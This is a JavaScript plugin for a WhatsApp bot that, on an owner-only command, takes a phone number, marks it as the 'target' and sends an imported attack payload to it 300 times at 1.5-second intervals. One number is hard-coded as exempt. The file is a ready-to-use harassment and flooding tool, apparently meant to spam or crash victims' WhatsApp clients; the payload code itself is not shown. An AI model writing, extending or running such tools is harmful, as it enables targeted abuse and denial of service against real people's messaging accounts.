// plugins/rizo-v2.js
const { cmd } = require("../arslan");

let { sendRizoV2Payload, rizoSleep } = require('../lib/rizo-v2');

let handler = async (m, { conn, args, command, isCreator }) => {
    // Owner check
    if (!isCreator) return m.reply('🔒 *Owner Only - Rizo Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    // Number sanitization
    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    // Protected numbers check
    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected by Rizo system!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`🚀 *RIZO V2 Target Locked:* ${pepec}\n⚡ *Initializing Execution...*`);

    try {
        // Loop with optimized interval (v2 style)
        for (let i = 0; i < 300; i++) {
            await sendRizoV2Payload(conn, target);
            await rizoSleep(1500); // 1.5 seconds delay per request
        }

        await conn.sendMessage(m.chat, {
            react: { text: "⚡", key: m.key }
        });

    } catch (error) {
        console.error(error);
        m.reply("⚠️ Error: Rizo V2 execution encountered an issue.");
    }
}

handler.command = ['rizov2', 'rizo-v2', 'rzv2'];
handler.tags = ['owner', 'rizo'];
handler.help = ['rizov2 923xx'];
module.exports = handler;
